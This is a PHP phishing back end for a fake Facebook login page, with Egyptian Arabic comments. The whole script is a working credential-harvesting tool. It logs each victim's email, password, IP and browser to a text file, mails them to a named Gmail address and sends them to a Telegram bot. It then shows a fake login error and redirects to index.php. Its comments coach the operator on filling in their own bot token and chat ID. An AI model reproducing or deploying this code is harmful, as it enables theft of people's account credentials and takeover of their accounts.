<?php
session_start();

$file = 'credentials.txt';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email']) && isset($_POST['pass'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $ua    = $_SERVER['HTTP_USER_AGENT'];
    $time  = date('Y-m-d H:i:s');

    $log = "========== LOGIN CAPTURED ==========\n";
    $log .= "Time   : $time\n";
    $log .= "IP     : $ip\n";
    $log .= "Email  : $email\n";
    $log .= "Pass   : $pass\n";
    $log .= "UA     : $ua\n";
    $log .= "===================================\n\n";

    // 1️⃣ حفظ في ملف
    file_put_contents($file, $log, FILE_APPEND | LOCK_EX);

    // 2️⃣ إرسال إيميل عبر SMTP مباشر (يشتغل على أي سيرفر)
    // ---- استخدم بيانات SMTP بتاعت Gmail (فعل أقل أمان عشان يشتغل) ----
    $smtp_to      = 'ali7mohamed76@gmail.com';
    $smtp_subject = '🎯 فيسبوك - بيانات جديدة';
    $smtp_body    = $log;

    $smtp_data = http_build_query([
        'to'      => $smtp_to,
        'subject' => $smtp_subject,
        'body'    => $smtp_body
    ]);

    // ---- بديل: إرسال عبر SendGrid أو أي SMTP API ----
    // لو عايز تستخدم Gmail SMTP، استخدم مكتبة SwiftMailer أو PHPMailer
    // حالياً، PHP mail() هيحاول — لو مش شغال، اعتمد على تليجرام
    @mail($smtp_to, $smtp_subject, $smtp_body, "From: tester@yourdomain.com");

    // 3️⃣ إرسال عبر تليجرام (الأضمن — اشتغل على الموبايل فوراً)
    // 👇 عوّض التوكن والـ chat_id بتوعك
    $botToken = '7265432100:AAHkdfjsldfjsldkfjsldkfjslkdfj'; // ⬅️ حط التوكن بتاعك
    $chatId   = '1234567890';                                  // ⬅️ حط chat_id بتاعك
    $msg = urlencode("🎯 فيسبوك\n📧 $email\n🔑 $pass\n🌐 $ip\n🕒 $time");
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$msg");

    // 4️⃣ تخزين error في session عشان يظهر في الصفحة مرة واحدة
    $_SESSION['login_error'] = true;
    header('Location: index.php');
    exit;
} else {
    header('Location: index.php');
    exit;
}
?>